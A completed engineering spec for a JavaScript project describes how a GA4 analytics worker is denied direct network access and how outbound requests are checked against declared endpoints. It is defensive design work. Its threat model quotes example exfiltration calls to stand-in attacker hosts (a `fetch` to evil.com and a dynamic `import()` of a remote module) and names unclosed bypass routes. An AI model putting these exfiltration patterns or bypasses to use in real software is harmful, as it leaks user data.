---
status: DONE
dependencies: []
last_verified: 2026-08-30
frame_review: true
---

<!-- jig grounding (spec 064-02 / ADR-0020): ground factual claims about
     runnable surfaces by probe first (run it / read source) or a citation. -->

## Slice 016-01 — GA4: confine the chamber + wire-protocol endpoint ceiling (the EXACT archetype)

**Goal:** Give the GA4 endpoint ceiling **real teeth** by closing **both** egress routes a compromised
GA4 chamber has. (1) **Fold in GA4-chamber egress-confinement**: withhold the GA4 chamber's ambient
network primitives (`fetch`/XHR/WebSocket/…) so its `ready` postMessage is its network egress path — a
direct in-worker `self.fetch("https://evil.com")` is **denied** (modulo the disclosed dynamic-`import()`
residual, below). (2) **Enforce the endpoint ceiling** at the async worker dispatch seam (`core/airlock.js`'s
`worker.onmessage` → `fetch(r.url)`): a generic `core/` control checks the outbound **origin + pathname**
against the host connector's **declared endpoints** and **HOLDS** an undeclared destination + surfaces it
(009-02). Confinement makes the seam the only *practical* door; the ceiling guards that door. GA4 is the
**exact** ceiling (bounded fixed endpoint). Keep it narrow (one archetype, one seam).

**DoR:**
- ✅ [ADR-0006](../../decisions/adr-0006-capability-manifest.md) Accepted — the ceiling law
  (`granted = declared ∩ host-policy ∩ consent`, declaration-as-ceiling, fails-closed).
- ✅ The confinement primitive exists: `connectors/alloy/egress-confinement.js` (`applyEgressConfinement`,
  pure — operates on a passed-in scope) withholds ambient network for the alloy chamber; it is the
  vendor-neutral basis for GA4-chamber confinement (relocated to `core/` for shared use).
- ✅ The manifest declares `endpoints` (`connectors/ga4/connector.js` → `[...new Set(config.endpoints)]`;
  `handle` posts `{ url: endpoints[t] }`). Grounded.
- ✅ The async worker dispatch seam (`core/airlock.js` `worker.onmessage` → `fetch(r.url)`) + the 009-02
  diagnostics seam exist. Grounded.

**Acceptance Criteria:**

1. **Generic ceiling control in `core/` (vendor-neutral, origin+pathname).** A new
   `core/endpoint-ceiling.js` exports `checkEndpointCeiling(url, declaredEndpoints)` →
   `{ verdict: "allow" | "hold", destination, reason }`, reducing **both** the outbound url and every
   declared endpoint to **origin + pathname** (dropping query + fragment); holds unless the outbound
   origin+path ∈ the declared set. No connector specifics in `core/`; `test/core-boundary.test.js` stays green.
2. **GA4-chamber egress-confinement folded in, applied BEFORE any connector code evaluates.** Withhold the
   GA4 chamber's ambient network — **including `fetch`** (unlike alloy, GA4's `fetch` is *not* a mediated
   surface; its egress is the `ready` postMessage, so `fetch` is **withheld**, and the success invariant is
   **fetch-WITHHELD** — the *inverse* of alloy's `fetchPreserved`, which must not be silently inherited).
   **CRITICAL — ordering (016-01 re-critique):** the GA4 chamber is a `type:"module"` worker that
   **statically imports** its connector, and ES-module **post-order** evaluation runs the connector module's
   top-level **before** the chamber body — so confinement placed in the body / `init` handler is **too
   late** (a compromised connector module captures `const f = self.fetch` at its top-level, and confinement
   only *reassigns* the property, leaving the captured reference live). Confinement MUST run before any
   connector-module code: as the chamber's **first side-effecting import** (a module that calls the
   confinement at its own top-level, so by post-order the connector import evaluates **under** confinement).
   Observable: a top-level `const f = self.fetch` captured by the connector module is already the withheld
   **throwing stub**; a handle-time `self.fetch`/`XMLHttpRequest`/`WebSocket` throws; the honest GA4 `handle`
   (map → `busy(performance.now)` → `JSON.stringify` → `ready`) is **unaffected** (uses no ambient network).
3. **Ceiling wired into the async worker seam (fail-closed).** In `core/airlock.js`'s `worker.onmessage`,
   **before** `fetch(r.url)`, each `ready` request is checked against the connector's declared endpoints;
   an undeclared destination is **HELD** — no `fetch`. Observable: a `ready` request to an undeclared
   origin+path → **zero** egress; a declared one dispatches unchanged.
4. **ALERT — every held destination surfaced (009-02).**
   `{ level: "error", kind: "endpoint-ceiling", disposition: "held", destination, reason }` through the
   `onDiagnostic` sink; `destination` names the outbound **origin+pathname** (not a user identifier;
   query/body never included → no `api_secret` leak). The honest path emits **none**.
5. **Per-connector attribution threaded in (not read from the request).** The declared endpoints are the
   host connector's, passed to `createAirlock` at construction (it already receives `endpoints`) and reduced
   to the ceiling set there — not derived from `r.url`. Observable: chamber code cannot widen its own
   ceiling. (Single-connector-per-host today; multi-chamber attribution is a named forward-looking follow-up.)
6. **The sync fast path's destination is config-pinned — asserted, not gated.** `core/egress.js` posts to
   `endpoints[t]` (host config, main-thread) — not chamber-chosen. A test asserts its destinations ⊆ the
   declared set; no redundant ceiling gate is added there.
7. **E2E: BOTH compromised-chamber routes are closed, including top-level capture.** A `test/` harness
   proves: (a) a chamber whose **connector module captures `self.fetch` at top-level** (the module-compromise
   threat, not just a handle-time call) and later invokes it is **denied** (confinement ran first → the
   captured reference is the throwing stub); a handle-time direct `self.fetch`/`XMLHttpRequest` is likewise
   denied; (b) a chamber that emits an **undeclared `ready`** destination is **held** at the async seam + a
   `endpoint-ceiling` diagnostic; (c) the **honest** path (a `ready` request to a declared endpoint)
   **dispatches** + silent. (a)+(b) together are the foreign-sink teeth.
8. **Named residuals — what the ceiling + confinement do NOT close (stated, not hidden).**
   (i) **Tenant-in-query re-route:** the ceiling compares origin+path only, so a compromised chamber posting
   to the **declared** GA4 origin+path with an **attacker's `measurement_id`** (GA4's tenant key, in the
   query) is **allowed** — the same-host tenant re-route, config-integrity's job, **deferred for GA4** by
   spec 015. (ii) **Dynamic `import()`:** a `type:"module"` worker supports `await import("https://evil/x")`
   — the specifier fetch itself exfiltrates, a route a JS shim **cannot** withhold (the disclosed residual
   `egress-confinement.js` already carries for alloy, 012-01 AC5; gated by a worker `connect-src` CSP where
   the host controls response headers). Both are **named** (comment + `refinement-todo`); neither is claimed closed.

**DoD:**
- [x] ACs 1–8 pass — top-level-captured + handle-time fetch denied AND an undeclared `ready` held +
      alerted; honest path dispatches + silent; sync-path invariant holds; residuals named. _(Targeted:
      endpoint-ceiling 9/9, endpoint-ceiling-seam 6/6, egress-confinement 9/9, alloy-egress-confinement 9/9,
      alloy-manifest-declaration 6/6, core-boundary 1/1 — 40/40, no hang.)_
- [x] **No regression** — the alloy chamber's confinement (`fetchPreserved` invariant intact) +
      config-integrity (015) + coalescing + GA4 + connector-host + contract-stability stay green (181/181
      across the adjacent neighborhood); the honest GA4 map/egress path unchanged.
- [x] Reviews: compliance + craft + **arch** (a new `core/` enforcement seam + folding chamber confinement
      in at the correct boot-ordering point + a data-flow change) recorded pass (independent Opus review of
      the Sonnet implementer's diffs — the ordering fix verified, tests re-run).
- [x] Deviation log + reconciliation sweep; the 012-04 advisory→authoritative flip reflected (its sentinel
      is 016-02's to flip; 016-01 leaves it); `docs/refinement-todo.md` got the tenant-in-query +
      dynamic-`import()` + multi-chamber-attribution follow-ups; `docs/releases/mvp3.md` Include row updated.
- [x] **No secrets committed** — no `api_secret`/`measurement_id` in any manifest, fixture, or diagnostic;
      synthetic hosts only; the ceiling compares origin+path (query dropped).

### Deviation log

- **Confinement ordering was the load-bearing fix (round-2 frame-critique).** Implemented via a
  first-import side-effecting module (`core/confine-ga4-chamber.js`, `core/chamber.worker.js`'s first
  import) so ES-module post-order runs confinement before the connector modules evaluate. A
  captured-before-confinement unit test proves *why* order matters; a source-order test pins that
  confinement IS first. A full real-`type:"module"`-Worker E2E is deferred to a browser rig (to avoid the
  stale-worktree hang) — the two unit tests establish the contract, stated honestly in the test.
- **Confinement relocated to `core/egress-confinement.js`** (from `connectors/alloy/`) + extended with a
  `withholdFetch` option; the alloy default path is byte-identical (fetch preserved); GA4 uses
  `withholdFetch:true` with the **inverse** success invariant (`fetchWithheld`, never `fetchPreserved:true`).
  Three importers repointed; alloy's confinement + manifest tests green.
- **Implementer added a 9th test file** (`test/endpoint-ceiling-seam.test.js`) using the existing
  `FakeWorker` pattern to cover the airlock-seam ACs (3/4/5/7b-c) — disclosed, no real-Worker hang.
- **AC6** needed no new code — `test/egress-fastpath.test.js` already asserts the sync path posts to
  `endpoints[t]` (destinations ⊆ declared set by construction).

### Reconciliation sweep

- New `core/endpoint-ceiling.js` (vendor-neutral) + `core/egress-confinement.js` (relocated, shared) +
  `core/confine-ga4-chamber.js` (first-import). No `core/ → rig/` import (boundary test green).
- Reviews recorded: frame-critique (two rounds) + compliance + craft + arch — all pass.
- `docs/refinement-todo.md`: the three named residuals tracked (tenant-in-query = deferred GA4
  config-integrity; dynamic-`import()`; multi-chamber attribution). `docs/releases/mvp3.md` Include row
  reflects the endpoint-ceiling GA4 delivery.
- The 012-04 boundary sentinel (alloy) is **not** flipped here — that is 016-02's alloy-seam job.
- No live identifiers / secrets; the ceiling compares origin+path (query dropped, so no `api_secret`).

**Anti-horizontal-phasing check:** after this slice, a compromised **GA4** chamber can **neither** reach the
network around the seam by direct or top-level-captured `fetch` (confined) **nor** post through the seam to
an undeclared destination (ceiling) — its foreign-sink egress is closed on both routes and any attempt is
surfaced, modulo the two **named** residuals (tenant-in-query, dynamic-`import()`). Observable value: the
first *confined-and-ceilinged* egress path in `core/`, exact for the wire-protocol archetype.
